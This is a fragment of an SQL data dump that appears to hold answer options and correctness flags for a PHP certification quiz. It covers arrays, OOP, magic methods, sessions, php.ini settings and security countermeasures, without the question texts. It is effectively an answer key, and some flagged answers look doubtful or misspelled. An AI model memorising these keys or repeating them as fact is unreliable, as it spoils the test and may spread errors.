	(438,62,'The keys will be sorted, however, elements will not be preserved.',0,'2012-11-18 22:46:58','2012-11-18 22:46:58'),
	(439,63,'c d',1,'2012-11-18 22:48:15','2012-11-18 22:48:15'),
	(440,63,'a b',0,'2012-11-18 22:48:15','2012-11-18 22:48:15'),
	(441,63,'b c',0,'2012-11-18 22:48:15','2012-11-18 22:48:15'),
	(442,63,'d e',0,'2012-11-18 22:48:15','2012-11-18 22:48:15'),
	(443,64,'d e f',1,'2012-11-18 22:49:45','2012-11-18 22:49:45'),
	(444,64,'c d e',0,'2012-11-18 22:49:45','2012-11-18 22:49:45'),
	(445,64,'b c d ',0,'2012-11-18 22:49:45','2012-11-18 22:49:45'),
	(446,64,'a b c',0,'2012-11-18 22:49:45','2012-11-18 22:49:45'),
	(447,65,'array(0) { }',1,'2012-11-18 22:52:16','2012-11-18 22:52:16'),
	(448,65,'array(3) { [\"\'a\'\"]=> int(20) [0]=> int(30) [1]=> int(35) }',0,'2012-11-18 22:52:16','2012-11-18 22:52:16'),
	(449,65,'array(1) { [\"\'a\'\"]=> int(20)}',0,'2012-11-18 22:52:16','2012-11-18 22:52:16'),
	(450,65,'The script will throw an error message.',0,'2012-11-18 22:52:16','2012-11-18 22:52:16'),
	(451,66,'4',1,'2012-11-18 22:53:13','2012-11-18 22:53:13'),
	(452,66,'6',0,'2012-11-18 22:53:13','2012-11-18 22:53:13'),
	(453,66,'19',0,'2012-11-18 22:53:13','2012-11-18 22:53:13'),
	(454,66,'The script will throw an error message',0,'2012-11-18 22:53:13','2012-11-18 22:53:13'),
	(455,67,'61',1,'2012-11-18 22:54:53','2012-11-18 22:54:53'),
	(456,67,'6',0,'2012-11-18 22:54:53','2012-11-18 22:54:53'),
	(457,67,'The script will throw an error message',0,'2012-11-18 22:54:53','2012-11-18 22:54:53'),
	(458,67,'7',0,'2012-11-18 22:54:53','2012-11-18 22:54:53'),
	(459,68,'354',1,'2012-11-18 22:55:56','2012-11-18 22:55:56'),
	(460,68,'The script will throw an error message',0,'2012-11-18 22:55:56','2012-11-18 22:55:56'),
	(461,68,'0',0,'2012-11-18 22:55:56','2012-11-18 22:55:56'),
	(462,68,'200',0,'2012-11-18 22:55:56','2012-11-18 22:55:56'),
	(463,69,'===',1,'2012-11-18 22:56:56','2012-11-18 22:56:56'),
	(464,69,'==',0,'2012-11-18 22:56:56','2012-11-18 22:56:56'),
	(465,69,'=',0,'2012-11-18 22:56:56','2012-11-18 22:56:56'),
	(466,69,'.',0,'2012-11-18 22:56:56','2012-11-18 22:56:56'),
	(467,70,'Array ( [0] => 0 [1] => 4 [2] => 1 [3] => 2 )',1,'2012-11-18 22:58:07','2012-11-18 22:58:07'),
	(468,70,'Array ( [0] => 0 [1] => 1 [2] => 2 [3] => 4 )',0,'2012-11-18 22:58:07','2012-11-18 22:58:07'),
	(469,70,'Array ( [0] => 4 [1] => 2 [2] => 1 [3] => 0 )',0,'2012-11-18 22:58:07','2012-11-18 22:58:07'),
	(470,70,'Array ( [0] => 1 [1] => 2 )',0,'2012-11-18 22:58:07','2012-11-18 22:58:07'),
	(471,71,'array_key_exists',0,'2012-11-18 22:58:55','2012-11-18 22:58:55'),
	(472,71,'in_array',1,'2012-11-18 22:58:55','2012-11-18 22:58:55'),
	(473,71,'array_keys',0,'2012-11-18 22:58:55','2012-11-18 22:58:55'),
	(474,71,'array_value',0,'2012-11-18 22:58:55','2012-11-18 22:58:55'),
	(475,72,'int(2)',0,'2012-11-18 23:00:03','2012-11-18 23:00:03'),
	(476,72,'int(1)',1,'2012-11-18 23:00:03','2012-11-18 23:00:03'),
	(477,72,'int(3)',0,'2012-11-18 23:00:03','2012-11-18 23:00:03'),
	(478,72,'int(0)',0,'2012-11-18 23:00:03','2012-11-18 23:00:03'),
	(479,73,'a = David b = Peter c = Martha d = Mark',1,'2012-11-18 23:01:02','2012-11-18 23:01:02'),
	(480,73,'a = David b = Mark c = Martha d = Peter',0,'2012-11-18 23:01:02','2012-11-18 23:01:02'),
	(481,73,'a = Mark b = David c = Peter d = Martha',0,'2012-11-18 23:01:02','2012-11-18 23:01:02'),
	(482,73,'The script will throw an error message.',0,'2012-11-18 23:01:02','2012-11-18 23:01:02'),
	(483,74,'extract($array);',1,'2012-11-18 23:03:33','2012-11-18 23:03:33'),
	(484,74,'implode($array);',0,'2012-11-18 23:03:33','2012-11-18 23:03:33'),
	(485,74,'ksort($array);',0,'2012-11-18 23:03:33','2012-11-18 23:03:33'),
	(486,74,'asort($array);',0,'2012-11-18 23:03:33','2012-11-18 23:03:33'),
	(491,75,'One',0,'2012-11-18 23:06:04','2012-11-18 23:06:04'),
	(492,75,'Two',0,'2012-11-18 23:06:04','2012-11-18 23:06:04'),
	(493,75,'Three',0,'2012-11-18 23:06:04','2012-11-18 23:06:04'),
	(494,75,'Four',1,'2012-11-18 23:06:04','2012-11-18 23:06:04'),
	(495,76,'array(1,2,3,4,5,6)',0,'2012-11-18 23:07:37','2012-11-18 23:07:37'),
	(496,76,'array(1=>4,2=>5,3=>6)',0,'2012-11-18 23:07:37','2012-11-18 23:07:37'),
	(497,76,'array(1=>2,3=>4,5=>6)',0,'2012-11-18 23:07:37','2012-11-18 23:07:37'),
	(498,76,'Warning message',1,'2012-11-18 23:07:37','2012-11-18 23:07:37'),
	(499,77,'sscanf(\"2011-09-09\", \'%d-%d-%d\',$year,$month,$day);',1,'2012-11-18 23:08:19','2012-11-18 23:08:19'),
	(500,77,'scanf(\"2011-09-09\", \'%d-%d-%d\',$year,$month,$day);',0,'2012-11-18 23:08:19','2012-11-18 23:08:19'),
	(501,77,'sprintf(\"2011-09-09\", \'%d-%d-%d\',$year,$month,$day);',0,'2012-11-18 23:08:19','2012-11-18 23:08:19'),
	(502,77,'printf(\"2011-09-09\", \'%d-%d-%d\',$year,$month,$day);',0,'2012-11-18 23:08:19','2012-11-18 23:08:19'),
	(503,78,'array_push()',0,'2012-11-18 23:09:23','2012-11-18 23:09:23'),
	(504,78,'array_pop()',0,'2012-11-18 23:09:23','2012-11-18 23:09:23'),
	(505,78,'array_unshift()',1,'2012-11-18 23:09:23','2012-11-18 23:09:23'),
	(506,78,'array_unique()',0,'2012-11-18 23:09:23','2012-11-18 23:09:23'),
	(507,79,'Array ( [0] => grape [1] => banana [2] => apple [3] => raspberry [4] => cherry )',1,'2012-11-18 23:11:36','2012-11-18 23:11:36'),
	(508,79,'Array ( [0] => orange [1] => banana [2] => apple [3] => raspberry [4] => cherry )',0,'2012-11-18 23:11:36','2012-11-18 23:11:36'),
	(509,79,'Array ( [0] => orange [1] => banana [2] => apple [3] => raspberry [4] => grape )',0,'2012-11-18 23:11:36','2012-11-18 23:11:36'),
	(510,79,'Array ( [0] => banana [1] => cherry [2] => grape )',0,'2012-11-18 23:11:36','2012-11-18 23:11:36'),
	(511,80,'array_change_key_case()',1,'2012-11-18 23:12:19','2012-11-18 23:12:19'),
	(512,80,'array_ chunk()',0,'2012-11-18 23:12:19','2012-11-18 23:12:19'),
	(513,80,'array_ combine()',0,'2012-11-18 23:12:19','2012-11-18 23:12:19'),
	(514,80,'array_count_values',0,'2012-11-18 23:12:19','2012-11-18 23:12:19'),
	(515,81,'array_diff_assoc()',1,'2012-11-18 23:13:07','2012-11-18 23:13:07'),
	(516,81,'array_diff_key()',0,'2012-11-18 23:13:07','2012-11-18 23:13:07'),
	(517,81,'array_diff_uassoc',0,'2012-11-18 23:13:07','2012-11-18 23:13:07'),
	(518,81,'array_diff_ukey',0,'2012-11-18 23:13:07','2012-11-18 23:13:07'),
	(519,82,'array_fill_keys()',1,'2012-11-18 23:13:59','2012-11-18 23:13:59'),
	(520,82,'array_fill()',0,'2012-11-18 23:13:59','2012-11-18 23:13:59'),
	(521,82,'array_filter()',0,'2012-11-18 23:13:59','2012-11-18 23:13:59'),
	(522,82,'array_flip()',0,'2012-11-18 23:13:59','2012-11-18 23:13:59'),
	(523,83,'array_intersect_assoc()',1,'2012-11-18 23:14:52','2012-11-18 23:14:52'),
	(524,83,'array_intersect_key()',0,'2012-11-18 23:14:52','2012-11-18 23:14:52'),
	(525,83,'array_keys',0,'2012-11-18 23:14:52','2012-11-18 23:14:52'),
	(526,83,'array_intersect_ukey()',0,'2012-11-18 23:14:52','2012-11-18 23:14:52'),
	(527,84,'array_intersect()',1,'2012-11-18 23:15:44','2012-11-18 23:15:44'),
	(528,84,'array_key_exists()',0,'2012-11-18 23:15:44','2012-11-18 23:15:44'),
	(529,84,'array_keys()',0,'2012-11-18 23:15:44','2012-11-18 23:15:44'),
	(530,84,'array_map()',0,'2012-11-18 23:15:44','2012-11-18 23:15:44'),
	(531,85,'array_merge()',1,'2012-11-18 23:16:58','2012-11-18 23:16:58'),
	(532,85,'array_pad()',0,'2012-11-18 23:16:58','2012-11-18 23:16:58'),
	(533,85,'array_pop()',0,'2012-11-18 23:16:58','2012-11-18 23:16:58'),
	(534,85,'array_product()',0,'2012-11-18 23:16:58','2012-11-18 23:16:58'),
	(535,86,'John',1,'2012-11-23 21:18:48','2012-11-23 21:18:48'),
	(536,86,'Maria',0,'2012-11-23 21:18:48','2012-11-23 21:18:48'),
	(537,86,'JohnMaria',0,'2012-11-23 21:18:48','2012-11-23 21:18:48'),
	(538,86,'The script will throw an error message.',0,'2012-11-23 21:18:48','2012-11-23 21:18:48'),
	(539,87,'$this.varname',0,'2012-11-23 21:23:11','2012-11-23 21:23:11'),
	(540,87,'$this->varname',1,'2012-11-23 21:23:11','2012-11-23 21:23:11'),
	(541,87,'$this->$varname',0,'2012-11-23 21:23:11','2012-11-23 21:23:11'),
	(542,87,'$this.$varname',0,'2012-11-23 21:23:11','2012-11-23 21:23:11'),
	(543,88,'Public',1,'2012-11-23 21:24:31','2012-11-23 21:24:31'),
	(544,88,'Abstract',0,'2012-11-23 21:24:31','2012-11-23 21:24:31'),
	(545,88,'Protected',0,'2012-11-23 21:24:31','2012-11-23 21:24:31'),
	(546,88,'Private',0,'2012-11-23 21:24:31','2012-11-23 21:24:31'),
	(547,89,'__set()',1,'2012-11-23 21:26:17','2012-11-23 21:26:17'),
	(548,89,'__get()',0,'2012-11-23 21:26:17','2012-11-23 21:26:17'),
	(549,89,'__getter()',0,'2012-11-23 21:26:17','2012-11-23 21:26:17'),
	(550,89,'__setter()',0,'2012-11-23 21:26:17','2012-11-23 21:26:17'),
	(551,90,'Static methods can only be called using the :: syntax and never from an instance.',0,'2012-11-23 21:27:01','2012-11-23 21:27:01'),
	(552,90,'Static methods do not provide a reference to $this.',1,'2012-11-23 21:27:01','2012-11-23 21:27:01'),
	(553,90,'Static methods cannot be called from within class instances.',0,'2012-11-23 21:27:01','2012-11-23 21:27:01'),
	(554,90,'Static methods don\'t have access to the self keyword.',0,'2012-11-23 21:27:01','2012-11-23 21:27:01'),
	(555,91,'True',1,'2012-11-23 21:28:14','2012-11-23 21:28:14'),
	(556,91,'False',0,'2012-11-23 21:28:14','2012-11-23 21:28:14'),
	(557,91,'NULL',0,'2012-11-23 21:28:14','2012-11-23 21:28:14'),
	(558,91,'Error',0,'2012-11-23 21:28:14','2012-11-23 21:28:14'),
	(559,92,'Closures allow the creation of functions which have no specified name.',0,'2012-11-23 21:28:58','2012-11-23 21:28:58'),
	(560,92,'The parent scope of a closure is the function in which the closure was declared (not necessarily the function it was called from).',0,'2012-11-23 21:28:58','2012-11-23 21:28:58'),
	(561,92,'It is possible to use func_num_args(), func_get_arg(), and func_get_args() from within a closure.',0,'2012-11-23 21:28:58','2012-11-23 21:28:58'),
	(562,92,'Closures may not inherit variables from the parent scope.',1,'2012-11-23 21:28:58','2012-11-23 21:28:58'),
	(563,93,'asort()',1,'2012-11-23 21:30:21','2012-11-23 21:30:21'),
	(564,93,'usort()',0,'2012-11-23 21:30:21','2012-11-23 21:30:21'),
	(565,93,'krsort()',0,'2012-11-23 21:30:21','2012-11-23 21:30:21'),
	(566,93,'ksort()',0,'2012-11-23 21:30:21','2012-11-23 21:30:21'),
	(567,94,'An empty array',0,'2012-11-23 21:31:23','2012-11-23 21:31:23'),
	(568,94,'0.001 => \'b\', .1 => c',0,'2012-11-23 21:31:23','2012-11-23 21:31:23'),
	(569,94,'0 => \'c\'',1,'2012-11-23 21:31:23','2012-11-23 21:31:23'),
	(570,94,'\'0.001\' => \'b\', \'0.1\' => c\'',0,'2012-11-23 21:31:23','2012-11-23 21:31:23'),
	(571,95,'This function must be called within a method context.',0,'2012-11-23 21:32:39','2012-11-23 21:32:39'),
	(572,95,'It uses late static binding.',0,'2012-11-23 21:32:39','2012-11-23 21:32:39'),
	(573,95,'All arguments of the forwarded method are passed as values, and as an array.',0,'2012-11-23 21:32:39','2012-11-23 21:32:39'),
	(574,95,'This function can be used outside a class.',1,'2012-11-23 21:32:39','2012-11-23 21:32:39'),
	(575,96,'$c = ((MyClass)$a->getInstance())->doSomething();',0,'2012-11-23 21:34:07','2012-11-23 21:34:07'),
	(576,96,'This cannot be re-written in PHP5.',0,'2012-11-23 21:34:07','2012-11-23 21:34:07'),
	(577,96,'$c = $a->getInstance()->doSomething();',1,'2012-11-23 21:34:08','2012-11-23 21:34:08'),
	(578,96,'$c = (MyClass)$a->getInstance();',0,'2012-11-23 21:34:08','2012-11-23 21:34:08'),
	(579,97,'B1A',1,'2012-11-23 21:35:04','2012-11-23 21:35:04'),
	(580,97,'B2A',0,'2012-11-23 21:35:04','2012-11-23 21:35:04'),
	(581,97,'B1B2',0,'2012-11-23 21:35:04','2012-11-23 21:35:04'),
	(582,97,'It will throw an error.',0,'2012-11-23 21:35:04','2012-11-23 21:35:04'),
	(583,98,'Yes',1,'2012-11-23 21:36:27','2012-11-23 21:36:27'),
	(584,98,'No',0,'2012-11-23 21:36:28','2012-11-23 21:36:28'),
	(585,98,'Error',0,'2012-11-23 21:36:28','2012-11-23 21:36:28'),
	(586,98,'NULL',0,'2012-11-23 21:36:28','2012-11-23 21:36:28'),
	(587,99,'Mark the variable as public.',0,'2012-11-23 21:42:00','2012-11-23 21:42:00'),
	(588,99,'Mark the variable as private.',0,'2012-11-23 21:42:00','2012-11-23 21:42:00'),
	(589,99,'Mark the variable as protected.',1,'2012-11-23 21:42:00','2012-11-23 21:42:00'),
	(590,99,'Mark the variable as final.',0,'2012-11-23 21:42:00','2012-11-23 21:42:00'),
	(591,100,'final',1,'2012-11-23 21:45:34','2012-11-23 21:45:34'),
	(592,100,'protected',0,'2012-11-23 21:45:34','2012-11-23 21:45:34'),
	(593,100,'public',0,'2012-11-23 21:45:34','2012-11-23 21:45:34'),
	(594,100,'abstract',0,'2012-11-23 21:45:34','2012-11-23 21:45:34'),
	(595,101,'10 20',1,'2012-11-23 21:48:42','2012-11-23 21:48:42'),
	(596,101,'10 20 30',0,'2012-11-23 21:48:42','2012-11-23 21:48:42'),
	(597,101,'10 20 0',0,'2012-11-23 21:48:42','2012-11-23 21:48:42'),
	(598,101,'The script will throw an error.',0,'2012-11-23 21:48:42','2012-11-23 21:48:42'),
	(599,102,'Use the session_set_save_handler() function.',1,'2012-11-23 21:51:06','2012-11-23 21:51:06'),
	(600,102,'Enable the session_save directive in the PHP.ini file.',0,'2012-11-23 21:51:06','2012-11-23 21:51:06'),
	(601,102,'Use the session_save_path() function.',0,'2012-11-23 21:51:06','2012-11-23 21:51:06'),
	(602,102,'Use the session_save() function.',0,'2012-11-23 21:51:06','2012-11-23 21:51:06'),
	(603,103,'__cal()',1,'2012-11-23 21:51:51','2012-11-23 21:51:51'),
	(604,103,'__test()',0,'2012-11-23 21:51:51','2012-11-23 21:51:51'),
	(605,103,'__autoload()',0,'2012-11-23 21:51:51','2012-11-23 21:51:51'),
	(606,103,'__load()',0,'2012-11-23 21:51:51','2012-11-23 21:51:51'),
	(607,104,'__toString()',1,'2012-11-23 21:53:29','2012-11-23 21:53:29'),
	(608,104,'__string()',0,'2012-11-23 21:53:29','2012-11-23 21:53:29'),
	(609,104,'__call()',0,'2012-11-23 21:53:29','2012-11-23 21:53:29'),
	(610,104,'__get()',0,'2012-11-23 21:53:29','2012-11-23 21:53:29'),
	(611,105,'__auto()',0,'2012-11-23 21:56:41','2012-11-23 21:56:41'),
	(612,105,'__autoload()',1,'2012-11-23 21:56:41','2012-11-23 21:56:41'),
	(613,105,'__load()',0,'2012-11-23 21:56:41','2012-11-23 21:56:41'),
	(614,105,'__include()',0,'2012-11-23 21:56:41','2012-11-23 21:56:41'),
	(615,106,'bye',1,'2012-11-23 21:58:20','2012-11-23 21:58:20'),
	(616,106,'hello',0,'2012-11-23 21:58:20','2012-11-23 21:58:20'),
	(617,106,'hellobye',0,'2012-11-23 21:58:20','2012-11-23 21:58:20'),
	(618,106,'The script will throw an error.',0,'2012-11-23 21:58:20','2012-11-23 21:58:20'),
	(619,107,'To interact with encoded scripts.',1,'2012-11-23 22:00:05','2012-11-23 22:00:05'),
	(620,107,'To provide complete overview of incompletely updated manual.',1,'2012-11-23 22:00:05','2012-11-23 22:00:05'),
	(621,107,'To know what is inside the class.',1,'2012-11-23 22:00:05','2012-11-23 22:00:05'),
	(622,107,'To know metadata of the PHP manual.',0,'2012-11-23 22:00:05','2012-11-23 22:00:05'),
	(623,108,'instanceof',1,'2012-11-23 22:02:26','2012-11-23 22:02:26'),
	(624,108,'Execution',0,'2012-11-23 22:02:26','2012-11-23 22:02:26'),
	(625,108,'Array',0,'2012-11-23 22:02:26','2012-11-23 22:02:26'),
	(626,108,'Logical',0,'2012-11-23 22:02:26','2012-11-23 22:02:26'),
	(627,109,'Value',0,'2012-11-23 22:03:46','2012-11-23 22:03:46'),
	(628,109,'Handle',0,'2012-11-23 22:03:46','2012-11-23 22:03:46'),
	(629,109,'Reference',1,'2012-11-23 22:03:46','2012-11-23 22:03:46'),
	(630,109,'Value as well as reference',0,'2012-11-23 22:03:46','2012-11-23 22:03:46'),
	(631,110,'To define undefined objects',0,'2012-11-23 22:11:19','2012-11-23 22:11:19'),
	(632,110,'To catch undefined methods',1,'2012-11-23 22:11:19','2012-11-23 22:11:19'),
	(633,110,'To catch undefined variables',0,'2012-11-23 22:11:19','2012-11-23 22:11:19'),
	(634,110,'To catch undefined objects',0,'2012-11-23 22:11:19','2012-11-23 22:11:19'),
	(635,111,'__toString()',1,'2012-11-23 22:12:29','2012-11-23 22:12:29'),
	(636,111,'__set_state()',0,'2012-11-23 22:12:29','2012-11-23 22:12:29'),
	(637,111,'__unset()',0,'2012-11-23 22:12:29','2012-11-23 22:12:29'),
	(638,111,'__isset()',0,'2012-11-23 22:12:29','2012-11-23 22:12:29'),
	(639,112,'extends',0,'2012-11-23 22:14:51','2012-11-23 22:14:51'),
	(640,112,'interface',0,'2012-11-23 22:14:51','2012-11-23 22:14:51'),
	(641,112,'instanceof',1,'2012-11-23 22:14:51','2012-11-23 22:14:51'),
	(642,112,'abstracts',0,'2012-11-23 22:14:51','2012-11-23 22:14:51'),
	(643,113,'The instanceof operator lets a programmer inspect all of the ancestor classes of the object, as well as any interfaces.',1,'2012-11-23 22:16:17','2012-11-23 22:16:17'),
	(644,113,'Type hinting is a feature due to which functions can specify what type of parameters must be provided to the functions.',1,'2012-11-23 22:16:17','2012-11-23 22:16:17'),
	(645,113,'The instanceof operator can be used to check if the variables are an instance of a particular class.',1,'2012-11-23 22:16:17','2012-11-23 22:16:17'),
	(646,113,'The instanceof operator can be used to check if the variables are the member of an abstract class.',0,'2012-11-23 22:16:17','2012-11-23 22:16:17'),
	(647,114,'Object',0,'2012-11-23 22:17:47','2012-11-23 22:17:47'),
	(648,114,'Array',0,'2012-11-23 22:17:47','2012-11-23 22:17:47'),
	(649,114,'String',1,'2012-11-23 22:17:47','2012-11-23 22:17:47'),
	(650,114,'Integer',1,'2012-11-23 22:17:47','2012-11-23 22:17:47'),
	(651,115,'ArrayAccess',0,'2012-11-23 22:18:31','2012-11-23 22:18:31'),
	(652,115,'SeekableIterator',1,'2012-11-23 22:18:31','2012-11-23 22:18:31'),
	(653,115,'Recursive Iterator',0,'2012-11-23 22:18:31','2012-11-23 22:18:31'),
	(654,115,'FilterIterator',0,'2012-11-23 22:18:31','2012-11-23 22:18:31'),
	(655,116,'When the try/catch block is unable to catch an error.',1,'2012-11-23 22:19:17','2012-11-23 22:19:17'),
	(656,116,'When you want to set a user-defined function to handle errors.',0,'2012-11-23 22:19:17','2012-11-23 22:19:17'),
	(657,116,'When you want to restore a previously defined exception handler function.',0,'2012-11-23 22:19:17','2012-11-23 22:19:17'),
	(658,116,'When you want to generate a user-level error/warning/notice message.',0,'2012-11-23 22:19:17','2012-11-23 22:19:17'),
	(659,117,'E_ALL',1,'2012-11-23 22:20:03','2012-11-23 22:20:03'),
	(660,117,'E_RECOVERABLE_ERROR',0,'2012-11-23 22:20:03','2012-11-23 22:20:03'),
	(661,117,'E_ERROR',0,'2012-11-23 22:20:03','2012-11-23 22:20:03'),
	(662,117,'E_WARNING',0,'2012-11-23 22:20:03','2012-11-23 22:20:03'),
	(663,118,'compress.zlib',1,'2012-11-23 22:20:46','2012-11-23 22:20:46'),
	(664,118,'http',0,'2012-11-23 22:20:46','2012-11-23 22:20:46'),
	(665,118,'file',0,'2012-11-23 22:20:46','2012-11-23 22:20:46'),
	(666,118,'php',0,'2012-11-23 22:20:46','2012-11-23 22:20:46'),
	(667,119,'ActiveRecord',1,'2012-11-23 22:21:51','2012-11-23 22:21:51'),
	(668,119,'Model-view-controller',0,'2012-11-23 22:21:51','2012-11-23 22:21:51'),
	(669,119,'Registry',0,'2012-11-23 22:21:51','2012-11-23 22:21:51'),
	(670,119,'Factory',0,'2012-11-23 22:21:51','2012-11-23 22:21:51'),
	(671,120,'session_regenerate',0,'2012-11-23 22:26:47','2012-11-23 22:26:47'),
	(672,120,'session_regenerate_id',1,'2012-11-23 22:26:47','2012-11-23 22:26:47'),
	(673,120,'session_start',0,'2012-11-23 22:26:47','2012-11-23 22:26:47'),
	(674,120,'session_destroy',0,'2012-11-23 22:26:47','2012-11-23 22:26:47'),
	(675,121,'crypt()',0,'2012-11-23 22:27:54','2012-11-23 22:27:54'),
	(676,121,'fingerprint()',0,'2012-11-23 22:27:54','2012-11-23 22:27:54'),
	(677,121,'md5()',1,'2012-11-23 22:27:54','2012-11-23 22:27:54'),
	(678,121,'hash()',0,'2012-11-23 22:27:54','2012-11-23 22:27:54'),
	(679,122,'open_basedir',1,'2012-11-23 22:29:12','2012-11-23 22:29:12'),
	(680,122,'disable_functions',1,'2012-11-23 22:29:12','2012-11-23 22:29:12'),
	(681,122,'disable_classes',1,'2012-11-23 22:29:12','2012-11-23 22:29:12'),
	(682,122,'shared_host',1,'2012-11-23 22:29:12','2012-11-23 22:29:12'),
	(683,123,'PHP_AUTH_USER',1,'2012-11-23 22:30:03','2012-11-23 22:30:03'),
	(684,123,'PHP_AUTH_PW',1,'2012-11-23 22:30:03','2012-11-23 22:30:03'),
	(685,123,'AUTH_TYPE',1,'2012-11-23 22:30:03','2012-11-23 22:30:03'),
	(686,123,'PHP_HTTP_AUTH',0,'2012-11-23 22:30:03','2012-11-23 22:30:03'),
	(687,124,'cgi.force_redirect',1,'2012-11-23 22:31:12','2012-11-23 22:31:12'),
	(688,124,'doc_root',1,'2012-11-23 22:31:12','2012-11-23 22:31:12'),
	(689,124,'user_dir',1,'2012-11-23 22:31:12','2012-11-23 22:31:12'),
	(690,124,'open_basedir',0,'2012-11-23 22:31:12','2012-11-23 22:31:12'),
	(691,125,'display_errors = off',1,'2012-11-23 22:32:02','2012-11-23 22:32:02'),
	(692,125,'log_errors = on',1,'2012-11-23 22:32:02','2012-11-23 22:32:02'),
	(693,125,'error_reporting = E_ALL | E_STRICT',0,'2012-11-23 22:32:02','2012-11-23 22:32:02'),
	(694,125,'cgi.force_redirect',0,'2012-11-23 22:32:02','2012-11-23 22:32:02'),
	(695,126,'10 min',0,'2012-11-23 22:33:01','2012-11-23 22:33:01'),
	(696,126,'30 min',0,'2012-11-23 22:33:01','2012-11-23 22:33:01'),
	(697,126,'60 min',0,'2012-11-23 22:33:01','2012-11-23 22:33:01'),
	(698,126,'Until the browser is closed.',1,'2012-11-23 22:33:01','2012-11-23 22:33:01'),
	(699,127,'The attacker must target a site that doesn\'t check the referrer header.',1,'2012-11-23 22:34:06','2012-11-23 22:34:06'),
	(700,127,'The attacker must determine the right values for all the form inputs.',1,'2012-11-23 22:34:06','2012-11-23 22:34:06'),
	(701,127,'The target site should have limited lifetime authentication cookies.',0,'2012-11-23 22:34:06','2012-11-23 22:34:06'),
	(702,127,'The target site should authenticate in GET and POST parameters, not only cookies.',0,'2012-11-23 22:34:06','2012-11-23 22:34:06'),
	(703,128,'SQL injection attack',0,'2012-11-23 22:36:01','2012-11-23 22:36:01'),
	(704,128,'Replay attack',0,'2012-11-23 22:36:01','2012-11-23 22:36:01'),
	(705,128,'escapeshellarg()',0,'2012-11-23 22:36:01','2012-11-23 22:36:01'),
	(706,128,'Cross-site scripting attack',1,'2012-11-23 22:36:01','2012-11-23 22:36:01'),
	(707,129,'escapeshellcmd()',1,'2012-11-23 22:36:46','2012-11-23 22:36:46'),
	(708,129,'escapeshellarg()',0,'2012-11-23 22:36:46','2012-11-23 22:36:46'),
	(709,129,'mysql_real_escape_string()',0,'2012-11-23 22:36:46','2012-11-23 22:36:46'),
	(710,129,'mysql_escape_string()',0,'2012-11-23 22:36:46','2012-11-23 22:36:46'),
	(711,130,'escapeshellarg()',1,'2012-11-23 22:37:26','2012-11-23 22:37:26'),
	(712,130,'escapeshellcmd()',0,'2012-11-23 22:37:26','2012-11-23 22:37:26'),
	(713,130,'mysql_escape_string()',0,'2012-11-23 22:37:26','2012-11-23 22:37:26'),
	(714,130,'mysql_real_escape_string()',0,'2012-11-23 22:37:26','2012-11-23 22:37:26'),
	(715,131,'register_globals set to off',1,'2012-11-23 22:38:23','2012-11-23 22:38:23'),
	(716,131,'display_error set to off',1,'2012-11-23 22:38:23','2012-11-23 22:38:23'),
	(717,131,'allow_url_include set to off',1,'2012-11-23 22:38:23','2012-11-23 22:38:23'),
	(718,131,'log_errors set to off',0,'2012-11-23 22:38:23','2012-11-23 22:38:23'),
	(719,132,'cgi.force_redirect',1,'2012-11-23 22:39:12','2012-11-23 22:39:12'),
	(720,132,'doc_root',1,'2012-11-23 22:39:12','2012-11-23 22:39:12'),
	(721,132,'user_dir',1,'2012-11-23 22:39:12','2012-11-23 22:39:12'),
	(722,132,'etc',0,'2012-11-23 22:39:12','2012-11-23 22:39:12'),
	(723,133,'allow_url_fopen = Off',1,'2012-11-23 22:40:11','2012-11-23 22:40:11'),
	(724,133,'use addslashes() function',0,'2012-11-23 22:40:11','2012-11-23 22:40:11'),
	(725,133,'Remove paths using basename() function',1,'2012-11-23 22:40:11','2012-11-23 22:40:11'),
	(726,133,'Check data against whitelist',1,'2012-11-23 22:40:11','2012-11-23 22:40:11'),
	(727,134,'SMTP',1,'2012-11-23 22:41:03','2012-11-23 22:41:03'),
	(728,134,'HTTP',0,'2012-11-23 22:41:03','2012-11-23 22:41:03'),
	(729,134,'FTP',0,'2012-11-23 22:41:03','2012-11-23 22:41:03'),
	(730,134,'SFTP',0,'2012-11-23 22:41:03','2012-11-23 22:41:03'),
	(731,135,'Session data',1,'2012-11-23 22:41:50','2012-11-23 22:41:50'),
	(732,135,'Cookie data',0,'2012-11-23 22:41:50','2012-11-23 22:41:50'),
	(733,135,'Remote IP address',0,'2012-11-23 22:41:50','2012-11-23 22:41:50'),
	(734,135,'User agent',0,'2012-11-23 22:41:50','2012-11-23 22:41:50'),
	(735,136,'Model',0,'2012-11-23 22:42:40','2012-11-23 22:42:40'),
	(736,136,'View',0,'2012-11-23 22:42:40','2012-11-23 22:42:40'),
	(737,136,'Controller',1,'2012-11-23 22:42:40','2012-11-23 22:42:40'),
	(738,136,'New',0,'2012-11-23 22:42:40','2012-11-23 22:42:40'),
	(739,137,'safe_mode = On',1,'2012-11-23 22:43:55','2012-11-23 22:43:55'),
	(740,137,'safe_mode_gid = On',1,'2012-11-23 22:43:55','2012-11-23 22:43:55'),
	(741,137,'open_basedir = /var/www/htdocs/files',0,'2012-11-23 22:43:55','2012-11-23 22:43:55'),
	(742,137,'register_globals = Off',0,'2012-11-23 22:43:55','2012-11-23 22:43:55'),
	(743,138,'SQL injection attack',1,'2012-11-23 22:45:16','2012-11-23 22:45:16'),
	(744,138,'Replay attack',0,'2012-11-23 22:45:16','2012-11-23 22:45:16'),
	(745,138,'Land attack',0,'2012-11-23 22:45:16','2012-11-23 22:45:16'),
	(746,138,'Dictionary attack',0,'2012-11-23 22:45:16','2012-11-23 22:45:16'),
	(747,139,'Prepared statement',1,'2012-11-23 22:47:57','2012-11-23 22:47:57'),
	(748,139,'mysql_real_escape_string()',1,'2012-11-23 22:47:57','2012-11-23 22:47:57'),
	(749,139,'mysql_escape_string()',0,'2012-11-23 22:47:57','2012-11-23 22:47:57'),
	(750,139,'session_regenerate_id()',0,'2012-11-23 22:47:57','2012-11-23 22:47:57'),
	(751,140,'escapeshellcmd()',1,'2012-11-23 22:49:45','2012-11-23 22:49:45'),
	(752,140,'escapeshellarg()',1,'2012-11-23 22:49:45','2012-11-23 22:49:45'),
	(753,140,'htmlentities()',0,'2012-11-23 22:49:45','2012-11-23 22:49:45'),
	(754,140,'strip_tags()',0,'2012-11-23 22:49:45','2012-11-23 22:49:45'),
	(755,141,'It escapes all special characters from strings $_POST[\"name\"] and $_POST[\"password\"].',1,'2012-11-23 22:51:40','2012-11-23 22:51:40'),
	(756,141,'It can be used as a countermeasure against a SQL injection attack.',1,'2012-11-23 22:51:40','2012-11-23 22:51:40'),
	(757,141,'It can be used to mitigate a cross-site scripting attack.',0,'2012-11-23 22:51:40','2012-11-23 22:51:40'),
